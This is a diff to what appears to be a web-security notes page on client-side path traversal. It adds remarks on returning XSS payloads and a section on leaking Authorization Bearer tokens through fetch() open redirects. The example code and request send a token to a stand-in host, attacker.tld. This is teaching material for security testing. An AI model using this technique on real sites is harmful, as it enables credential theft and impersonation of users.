@@ -279,6 +279,8 @@ The goal of returning arbitrary content in CSPT getting user input into places i
 
 As seen in many of the examples above, if HTML is expected, you can simply return an XSS payload. Some frameworks like [HTMX](https://htmx.org/docs/) or hotswapping logic work this way where raw HTML is expected to be returned. If you are able to inject into any of these kinds of paths, it's a great target.
 
+You are often able to provide different content types (like JSON) and have it parsed successfully as HTML.
+
 Also note how the JavaScript handles your HTML after is receives it. If it parses and extracts some part (eg. with a `querySelector`), match that with your injection.
 
 ### Recursion
@@ -286,6 +288,35 @@ Also note how the JavaScript handles your HTML after is receives it. If it parse
 When the response is JSON, you've gained control over some properties. So why not CSPT them as well?
 
 This is a very common situation, where the server fetches some IDs from the server, which it trusts, and then does more sensitive stuff with. It can lead to even more user input, eventually [#html](client-side-path-traversal-cspt.md#html "mention") or the request itself may be an interesting [#csrf](client-side-path-traversal-cspt.md#csrf "mention") target (eg. going from GET to a POST).
+
+### Authorization Header
+
+Fairly often, the `fetch()` call you have a Path Traversal in sets some custom options like `headers:`. If you are able to [#open-redirect](client-side-path-traversal-cspt.md#open-redirect "mention") to your attacker's domain, all attributes of the request will be sent to you which may include sensitive information. You may see an `X-CSRF:` header or `csrf_token=` body parameter which you can then use to CSRF the victim, or see an API key in some query parameter.
+
+One edge case is if the sensitive information is inside the `Authorization:` header. This is common for `Bearer` access tokens, and this header name has a special rule depending on whether the URL passed into `fetch()` is **same-origin** or not ([source](https://www.insert-script.com/examples/redirectAuthHeader/send.html)):
+
+* If it is same-origin, the browser expects you intend to keep the header private, and if a cross-origin redirect happens will _throw away_ that header.
+* If it is cross-origin initially, the browser expects you intend to share the header with other origins, and will _keep_ the header even across more cross-origin redirects.
+
+The check is same-origin meaning even a difference of `www.` or `api.` in the fetched domain will count as cross-origin (even if same-site). In this case, being able to open redirect, the `Authorization:` header will be sent with the request to your attacker's domain. You can then impersonate the victim with this access token.
+
+{% code title="https://example.com" %}
+```javascript
+fetch("https://api.example.com/open-redirect?url=https://attacker.tld/leak", {
+  headers: {
+    Authorization: "Bearer abc123"
+  }
+})
+```
+{% endcode %}
+
+{% code title="Request" %}
+```http
+GET /leak HTTP/1.1
+Host: attacker.tld
+Authorization: Bearer abc123
+```
+{% endcode %}
 
 ## CSRF
 
